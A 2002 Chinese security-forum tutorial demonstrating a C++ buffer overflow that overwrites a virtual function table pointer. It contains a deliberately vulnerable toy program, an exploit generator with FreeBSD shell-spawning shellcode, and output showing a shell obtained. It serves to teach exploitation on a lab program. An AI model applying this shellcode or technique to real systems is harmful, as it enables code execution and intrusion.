---
title: "一个C++溢出虚函数指针的更真实试验"
date: 2002-04-24T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-383"
---

(inburst_at_263.net)

发信人：watercloud（watercloud），信区：网络安全

标��题：一个C++溢出虚函数指针的更真实试验 

发信站：安全焦点（2002-04-24 19:55:55） 

先写一个程序bug.cpp 

里边getBuff方法从文件bug.conf中读入一行到buff中，没有进行边界检查。 

printBuff是一个虚函数 


#include<iostream.h> 

#include<fstream.h> 

#include<unistd.h> 


class ClassBase 

{ 

public: 

  char buff[128]; 


  void getBuff() 

  { 

     ifstream myin; 

     myin.open("bug.conf"); 

     cout << "Get buff from file : bug.conf" << endl; 

     myin >> buff;    // 看，这种用法的人不是少数吧 ! 

  }; 

  virtual void printBuffer(void){}; 

}; 


class  ClassA :public ClassBase 

{ 

public: 

  void printBuffer(void) 

  { 

     cout << "Name :" << buff << endl; 

  }; 

}; 


int main(void) 

{ 

  ClassA a; 

  ClassBase * pa = &a; 


  cout << &a << endl; 


  a.getBuff();   // ----这个里边没有边界检查 ! 

  pa->printBuffer(); 


  return 0; 

} 

编译: 

bash-2.05$ gcc bug.cpp -lstdc++ -o bug 

然后创建一个文件bug.conf 写一行cloud 然后运行bug看看: 

bash-2.05$ ./bug 

0xbfbffb38 

Get buff from file : bug.conf 

Name :cloud 

bash-2.05$ 


看，读入数据并显示了 。 


我们接下来的目的就是生成一个特别点的bug.conf让他执行里边的代码得到机器码! 

写攻击程序有两个难点：&a 的起始地址 ??? a.buff的长度 ??? 


当然这是我们自己的程序 ，看上面的打印结果就是  &a = 0xbfbffb38  ,当然 len = 128 

自己的就是方便，要是别人的就要用gdb来调了 呵呵! 


好了我们来写一个攻击程序: 

ex.c 


#include<stdio.h> 


char  buffer[512],*pc; 

long  * pl = (long *) buffer; 


long  ex_addr = 0xbfbffb38; 

int   ex_buff_len=128; 


char  shellcode[]="1\xc0Ph//shh/binT[PPSS4;\xcd\x80";  // shellcode for FreeBSD 

                       //你可以换成其他平台的shellcode 

int i; 


int main(void) 

{ 


  for(i=0;i<3;pl[i++]=0x41414141); 


  pl[3]=ex_addr+16; 


  pc = buffer+16; 


  strcpy(pc,shellcode); 

  pc+=strlen(shellcode); 


  for(;pc - buffer < ex_buff_len; *pc++='D'); 


  pl=(long *) pc; 

  *pl= ex_addr; 

  pc+=4; 

  *pc=0; 


  printf("%s\n\n",buffer); 

  return 0; 

} 


编译: gcc ex.c -o ex 

运行显示: 

AAAAAAAAAAAAH&ucirc;&iquest;&iquest;1&Agrave;Ph//shh/binT[PPSS4;&Iacute;DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD8&ucirc; 

&iquest;&iquest; 


呵呵，这就是我们构建的特殊字符窜,构建原理和原来文章讲的一样就不多说了! 

一个补充的是 我用的shellcode是for freebsd的，故程序只能在freebsd上测试 

当然你可以换成其他平台的shellcode 就可以在其他平台上测试了(但一定要是gcc) 

好了，开始攻击: 


bash-2.05$ ./ex > bug.conf       

bash-2.05$ ./bug 

0xbfbffb38 

Get buff from file : bug.conf 

$        <------------看攻击成功了!!! 


更多的信息参见 

<<C++中通过溢出覆盖虚函数指针列表执行代码>> 

[http://magazine.nsfocus.com/detail.asp?id=1291](http://magazine.nsfocus.com/detail.asp?id=1291) 


                      __ watercloud __


--

※ 来源:・安全焦点讨论区 [www.xfocus.net](http://www.xfocus.net/)・
